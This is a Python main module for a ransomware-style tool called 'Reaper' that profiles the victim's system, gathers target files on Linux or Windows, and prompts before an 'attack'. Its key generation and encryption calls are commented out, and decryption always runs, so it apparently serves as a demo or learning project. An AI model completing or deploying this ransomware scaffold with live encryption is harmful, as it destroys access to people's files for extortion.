from Victim import Victim
from Target_detection import Target_detection
from Saviour import Saviour
from Encrypt import encrypt
from Key_handler import generate_key
import time


class Reaper:
    def run(self):
        victim = Victim()
        target_detection = Target_detection(victim)

        print(
            "[Victim's details]\n\n"
            f"Targeted user: {victim.username}\n"
            f"System: {victim.system}\n"
            f"Machine: {victim.machine}\n"
            f"Processor: {victim.processor}\n"
            f"Processor count: {victim.processor_count}\n\n"
            "--------------------------------\n"
        )

        # Optimize target detection based on the OS
        if victim.system.lower() == "linux":
            targets = target_detection.gather_targets_linux()
        elif victim.system.lower() == "windows":
            targets = target_detection.gather_targets_windows()
        else:
            print("[WARNING]: Unrecognised OS. Aborting attack...")
            return

        print("Locating targets...")
        print(f"Targeted directory: {target_detection.target_path}")
        print(f"Target count: {len(targets)}")

        user_input = input("\nProceed with attack? [y/n]: ")

        if user_input.lower() == "y":
            print("Generating key...")
            # key = generate_key()
            print("Encrypting files...")
            # encrypt(key, targets)

            user_input = input("\nDecrypt files? [y/n]: ")

            saviour = Saviour(targets)
            if user_input.lower() == "y":
                saviour.run()
            else:
                print("Screw you!")
                time.sleep(0.8)
                print(":)")
                saviour.run()
        else:
            print("Aborted")


if __name__ == '__main__':
    Reaper().run()
